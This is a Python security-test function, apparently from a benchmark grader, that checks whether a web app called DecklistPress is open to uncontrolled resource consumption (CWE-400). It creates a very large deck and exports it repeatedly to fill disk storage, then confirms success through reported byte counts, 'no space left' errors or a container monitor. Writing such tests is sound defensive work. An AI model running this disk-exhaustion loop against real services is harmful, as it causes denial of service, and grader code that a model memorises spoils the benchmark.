...
def sec_test_uncontrolled_resource_consumption(
    ...
    try:
        logger.info(
            "Starting CWE-400 (Uncontrolled Resource Consumption) PoC against DecklistPress."
        )
        ...
        ws_resp = create_workspace(app, f"ws-{marker}")
        if ws_resp.status_code != 201:
            logger.warning(
                "Workspace creation failed with status %d.", ws_resp.status_code
            )
            return set()
        ...
        # 2) Upsert a large deck (try progressively smaller configs if initial attempt is rejected)
        # Configs: (lines_count, cardname_len)
        configs = [
            (1024, 8192),  # ~8 MB per export expected
            (1024, 6144),
            (512, 8192),
            (512, 4096),
            (256, 4096),
        ]
        deck_id, deck_resp_json = _try_upsert_large_deck(
            app, workspace_id, marker, configs
        )
        if not deck_id:
            logger.warning(
                "Failed to create a sufficiently large deck; cannot demonstrate resource consumption via export."
            )
            return set()

        # Optional: log summary sizes (without revealing marker)
        try:
            summary = deck_resp_json.get("summary", {})
            logger.info(
                "Deck summary: totalCards=%s, lineCount=%s",
                summary.get("totalCards"),
                summary.get("lineCount"),
            )
        except Exception:
            logger.info("Deck summary unavailable.")

        # 3) Export repeatedly to accumulate disk usage
        # Target threshold for cumulative exported bytes (128 MiB) to demonstrate resource consumption
        TARGET_BYTES = 128 * 1024 * 1024
        MAX_EXPORTS = 200  # hard cap to avoid infinite loops in degenerate cases
        cumulative_bytes = 0
        exports_done = 0
        enospc_detected = False

        # Perform one export first to estimate per-file size
        first_path = "exp_0001.txt"
        logger.info("Performing initial export to estimate file size.")
        first_export = export_deck(app, workspace_id, deck_id, first_path)
        if first_export.status_code != 201:
            # If the server fails on first export, log and abort
            logger.warning(
                "First export failed with status %d.", first_export.status_code
            )
            # If failure looks like resource pressure, mark success
            try:
                msg = first_export.text.lower()
                if "no space left" in msg or "enospc" in msg:
                    enospc_detected = True
            except Exception:
                pass
        else:
            data = first_export.json()
            file_bytes = int(data.get("sizeBytes", 0))
            cumulative_bytes += file_bytes
            exports_done += 1
            logger.info(
                "Export %d completed, sizeBytes=%d, cumulative=%d.",
                exports_done,
                file_bytes,
                cumulative_bytes,
            )

        # Continue exporting until we exceed threshold or hit max exports
        i = 2
        while (
            cumulative_bytes < TARGET_BYTES
            and exports_done < MAX_EXPORTS
            and not enospc_detected
        ):
            rel_path = f"exp_{i:04d}.txt"
            resp = export_deck(app, workspace_id, deck_id, rel_path)
            if resp.status_code != 201:
                logger.warning("Export #%d failed with status %d.", i, resp.status_code)
                try:
                    msg = resp.text.lower()
                    if "no space left" in msg or "enospc" in msg:
                        enospc_detected = True
                        logger.info(
                            "Detected storage exhaustion indicator during export #%d.",
                            i,
                        )
                        break
                except Exception:
                    pass
                # Non-201 but not storage related; stop trying further
                break
            try:
                data = resp.json()
            ...
            exports_done += 1
            if exports_done % 5 == 0 or cumulative_bytes >= TARGET_BYTES:
                logger.info(
                    "Exports: %d, last size: %d, cumulative: %d.",
                    exports_done,
                    size_bytes,
                    cumulative_bytes,
                )
        ...
        # Primary signal: cumulative bytes reported by the service exceed threshold
        if cumulative_bytes >= TARGET_BYTES:
            logger.info(
                "Cumulative exported bytes exceeded the target threshold (%d bytes).",
                TARGET_BYTES,
            )
            success = True

        # Second signal: storage exhaustion error from the service
        if enospc_detected:
            logger.info(
                "Detected 'no space left on device' condition from the backend."
            )
            success = True

        # Third signal: container-level resource monitor indicates storage usage beyond threshold.
        # Use the smaller of cumulative_bytes and a sane upper bound, but at least 64 MiB.
        monitor_threshold = max(
            64 * 1024 * 1024, min(cumulative_bytes, 2 * TARGET_BYTES)
        )
        try:
            monitor_ok = monitor_container_resources(
                ...
                duration=10,
                logger=logger,
                storage_usage_threshold=monitor_threshold,
            )
            logger.info(
                "Resource monitor result: %s (threshold=%d).",
                str(monitor_ok),
                monitor_threshold,
            )
            success = success or monitor_ok
        except Exception as e:
            logger.warning("Resource monitoring failed: %s", e)

        if success:
            logger.info(
                "CWE-400 PoC succeeded: uncontrolled resource consumption is demonstrated."
            )
            return {cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION}

        logger.info("CWE-400 PoC did not reach the success criteria.")
        return set()

    except Exception as e:
        logger.exception("Unexpected error during CWE-400 PoC: %s", e)
        return set()
